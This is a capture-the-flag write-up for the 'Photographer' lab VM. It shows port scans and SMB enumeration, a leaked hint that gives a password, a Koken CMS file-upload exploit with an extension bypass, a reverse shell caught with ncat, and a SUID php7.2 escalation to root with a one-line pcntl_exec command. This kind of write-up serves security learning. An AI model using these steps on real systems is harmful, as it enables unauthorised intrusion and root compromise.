# Ports Scan & Enumeration
## Ports Scan
```bash
└╼cn$ nmap -v -e bridge100 --top-ports 1000 192.168.20.8                                       130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 11:58 CST
Initiating Ping Scan at 11:58
Scanning 192.168.20.8 [2 ports]
Completed Ping Scan at 11:58, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:58
Completed Parallel DNS resolution of 1 host. at 11:58, 1.86s elapsed
Initiating Connect Scan at 11:58
Scanning 192.168.20.8 [1000 ports]
Discovered open port 80/tcp on 192.168.20.8
Discovered open port 445/tcp on 192.168.20.8
Discovered open port 139/tcp on 192.168.20.8
Discovered open port 53/tcp on 192.168.20.8
Discovered open port 8000/tcp on 192.168.20.8
Completed Connect Scan at 11:59, 42.07s elapsed (1000 total ports)
Nmap scan report for 192.168.20.8
Host is up (0.0013s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt

Read data files from: /usr/local/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 44.01 seconds

└╼cn$ nmap -e bridge100 -p53,80,139,445,8000 -A 192.168.20.8                                   130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 13:02 CST
Nmap scan report for 192.168.20.8
Host is up (0.0025s latency).

PORT     STATE SERVICE     VERSION
53/tcp   open  domain?
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 9h19m59s, deviation: 2h18m33s, median: 7h59m59s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2021-05-09T09:03:05-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-09T13:03:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.14 seconds
````

- Koken 0.22.24 on port 8000
- Another website run on port 80
- samba share.

## Port 80
### nikto
```bash
└╼cn$ nikto -host 192.168.20.8
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.8
+ Target Hostname:    192.168.20.8
+ Target Port:        80
+ Start Time:         2021-05-09 13:04:35 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x164f 0x5aaf04d7cd1a0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-05-09 13:04:54 (GMT8) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
````

### gobuster
```bash
└╼cn$ gobuster dir -u http://192.168.20.8 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              aspx,jsp,txt,htm,html,php,asp
[+] Timeout:                 10s
===============================================================
2021/05/09 13:08:46 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 5711]
/images               (Status: 301) [Size: 313] [--> http://192.168.20.8/images/]
/assets               (Status: 301) [Size: 313] [--> http://192.168.20.8/assets/]
/generic.html         (Status: 200) [Size: 4243]
/elements.html        (Status: 200) [Size: 19831]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/05/09 13:19:12 Finished
===============================================================
````
- Checked those folders and files, not much clue.

## Port 8000
### nikto
```bash
└╼cn$ nikto -host 192.168.20.8 -port 8000
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.8
+ Target Hostname:    192.168.20.8
+ Target Port:        8000
+ Start Time:         2021-05-09 13:04:51 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1264 0x5c1e548316cb8
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-koken-cache' found, with contents: hit
+ All CGI directories 'found', use '-C none' to test none
+ Uncommon header 'x-xhr-current-location' found, with contents: http://192.168.20.8/
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /app/: This might be interesting...
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ 26190 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-05-09 13:06:43 (GMT8) (112 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
````

- gobuster failed to run on koken port 8000, all satus code is 301.
- Wapplyzer and source code of index page tell that koken version is 0.22.24
![[Pasted image 20210509152834.png]]
![[Pasted image 20210509152906.png]]
- So got from searchsploit that we do have an file upload exploit of this koken version
```bash
└╼cn$ searchsploit koken
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)          | php/webapps/48706.txt
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
````
https://www.exploit-db.com/exploits/48706
- And check the Author of it:
![[Pasted image 20210509153743.png]]
- He is the author of this box as well. So this must be it, it's just, we might have to login first?
	-	This might be samba share coming in?

## Samba
```bash
└╼cn$ smbmap -u '' -r -H 192.168.20.8

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap


[+] IP: 192.168.20.8:445	Name: 192.168.20.8        	Status: Guest session
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Samba on Ubuntu
	.\sambashare\\*
	dr--r--r--                0 Tue Jul 21 09:30:07 2020	.
	dr--r--r--                0 Tue Jul 21 17:44:25 2020	..
	fr--r--r--              503 Tue Jul 21 09:29:39 2020	mailsent.txt
	fr--r--r--         13930308 Tue Jul 21 09:22:23 2020	wordpress.bkp.zip
	IPC$                                              	NO ACCESS	IPC Service (photographer server (Samba, Ubuntu))
	
└╼cn$ smbmap -u '' --download 'sambashare/mailsent.txt' -H 192.168.20.8

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[+] Starting download: sambashare\mailsent.txt (503 bytes)
[+] File output to: /private/tmp/192.168.20.8-sambashare_mailsent.txt


└╼cn$ smbmap -u '' --download 'sambashare/wordpress.bkp.zip' -H 192.168.20.8

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[+] Starting download: sambashare\wordpress.bkp.zip (13930308 bytes)
[+] File output to: /private/tmp/192.168.20.8-sambashare_wordpress.bkp.zip

└╼cn$ cat 192.168.20.8-sambashare_mailsent.txt
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
````
- Two usernames:
	- username: `agi`
	- username: `daisa`
- hostname: `photographer.com`
- is the secret `mybabygirl` or `babygirl` of user daisa `daisa@photographer.com`?
- OK it's `babygirl`, and we are in.
![[Pasted image 20210509155758.png]]
- Now it's time to upload file.

## Koken
- upload file exploit
![[Pasted image 20210509162112.png]]
- remove the jpg extension by burp, so it can bypass the name check.
![[Pasted image 20210509163747.png]]
- Then we will have the access link
![[Pasted image 20210509163904.png]]
- Here we go, we now have RCE:
![[Pasted image 20210509163950.png]]

# Privesc
## Reconn
```bash
└╼cn$ bash

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
bash-3.2$ ncat -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.20.8.
Ncat: Connection from 192.168.20.8:45212.
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@photographer:/var/www/html/koken/storage/originals/85/0d$ ^Z
[1]+  Stopped                 ncat -lvnp 4444
bash-3.2$ stty raw -echo
bash-3.2$ ncat -lvnp 4444

<www/html/koken/storage/originals/85/0d$ export TERM=xterm
cols 204@photographer:/var/www/html/koken/storage/originals/85/0d$ stty rows 50
```

- username `agi`and `daisa`confirmed, and daisa can do sudo
```bash
www-data@photographer:/$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
agi:x:1001:1001:,,,:/home/agi:/bin/bash
daisa:x:1000:1000:daisa:/home/osboxes:/bin/bash

www-data@photographer:/home$ cd daisa
www-data@photographer:/home/daisa$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e

-rw-r--r-- 1 daisa daisa 0 Jul 20  2020 /home/daisa/.sudo_as_admin_successful
````

- mysql running, this remind me that I do have a wordpress backup zip did not check....hmmm, just chekced, there's no wp-config.php exist.
```bash
www-data@photographer:/home/daisa$ netstat -anlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp        0    118 192.168.20.8:45212      192.168.20.1:4444       ESTABLISHED 22517/python
tcp6       0      0 :::139                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -
tcp6       0      0 :::8000                 :::*                    LISTEN      -
tcp6       0      0 192.168.20.8:8000       192.168.20.1:59859      ESTABLISHED -
```

- mysql credential here, but since mysql is running by mysql user, it's not that useful
```bash
www-data@photographer:/dev/shm$ grep -n5 password /var/www/html/koken/storage/configuration/database.php
1-<?php
2-	return array(
3-		'hostname' => 'localhost',
4-		'database' => 'koken',
5-		'username' => 'kokenuser',
6:		'password' => 'user_password_here',
7-		'prefix' => 'koken_',
8-		'socket' => ''
9-	);
````

- can't switch user to `daisa` or `agi` by the only password `babygirl`
```bash
www-data@photographer:/$ su daisa
Password:
su: Authentication failure
www-data@photographer:/$ su agi
Password:
su: Authentication failure
````

- checked by linpeas.sh, no very obvious target. also checked by pspy, no timely task. I'm lost.
```bash
[+] Users with console
agi:x:1001:1001:,,,:/home/agi:/bin/bash
daisa:x:1000:1000:daisa:/home/osboxes:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(daisa) gid=1000(daisa) groups=1000(daisa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
uid=1001(agi) gid=1001(agi) groups=1001(agi)

====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root       4.7M Jul  9  2020 /usr/bin/php7.2
```

- reviewed peas again, seems like the php7.2 is the only one not normal.
- but I would still need a sudo user.
- Or not.........
![[Pasted image 20210509175725.png]]
```bash
www-data@photographer:/dev/shm$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
# ls -al
total 44
drwx------  4 root root 4096 Jul 21  2020 .
drwxr-xr-x 24 root root 4096 May  9 08:05 ..
-rw-------  1 root root   49 Jul 21  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
-rw-------  1 root root  216 Jul 20  2020 .mysql_history
drwxr-xr-x  2 root root 4096 Jul 20  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 5223 Jul 21  2020 .viminfo
-rw-------  1 root root 2084 Jul 21  2020 proof.txt
# cat proof.txt

                                .:/://::::///:-`
                            -/++:+`:--:o:  oo.-/+/:`
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`
                       :o:``oyo/o`. `      ```/-so:+--+/`
                     -o:-`yh//.                 `./ys/-.o/
                    ++.-ys/:/y-                  /s-:/+/:/o`
                   o/ :yo-:hNN                   .MNs./+o--s`
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-
                        ./+:`:yh:dso/.+-++++ss+h++.:++-
                           -/+/-:-/y+/d:yh-o:+--/+/:`
                              `-///////////////:`


Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
````

